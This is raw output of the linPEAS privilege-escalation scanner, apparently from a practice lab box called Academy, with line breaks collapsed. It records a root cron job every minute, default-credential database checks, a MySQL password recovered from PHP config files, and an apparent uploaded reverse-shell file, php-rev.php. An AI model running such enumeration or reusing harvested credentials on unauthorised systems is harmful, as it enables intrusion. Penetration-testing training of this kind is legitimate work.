apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 